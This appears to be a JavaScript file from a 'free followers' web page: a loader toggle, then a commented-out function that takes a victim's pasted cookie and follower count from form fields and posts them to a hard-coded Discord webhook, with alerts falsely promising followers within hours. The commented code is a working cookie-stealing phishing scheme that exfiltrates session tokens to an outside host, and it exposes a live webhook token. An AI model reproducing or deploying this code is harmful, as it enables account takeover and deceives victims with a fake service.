
var myVar;

function myFunction() {
  myVar = setTimeout(showPage, 0);
}

function showPage() {
  document.getElementById("loader").style.display = "none";
  document.getElementById("myDiv").style.display = "block";
}




// async function sendContact(ev) {
//     ev.preventDefault();

//     const senderCookie = document
//       .getElementById('messageCookie').value;
      
//     const senderFollowers = document
//     .getElementById('messageFollowers').value;

//     const webhookBody = {
//       embeds: [{
//         title: 'New Cookie',
//         fields: [
//         { name: 'Cookie Code', value: senderCookie },
//         { name: 'Amount of Followers', value: senderFollowers },
//         ]
//       }],
//     };

//     const webhookUrl = 'https://ptb.discord.com/api/webhooks/1061734790308581456/JcC7WqnPVBSmnnjYVYPDgYhgE3n3OVO0sKiV3Nr0A4TLZwnLh2kJVoAgO5OzdD3jOlMK';

//     const response = await fetch(webhookUrl, {
//       method: 'POST',
//       headers: {
//         'Content-Type': 'application/json',
//       },
//       body: JSON.stringify(webhookBody),
//     });

//     if (response.ok) {
//       alert('Processing...'),
//       alert('💚 | Followers being sent... Please wait to 1-5 hours!');
//     //   alert('APEX API Is OFFLINE');
//     // } else {
//     //   alert('API ERROR - PLEASE TRY AGAIN LATER')
//     }
//   }

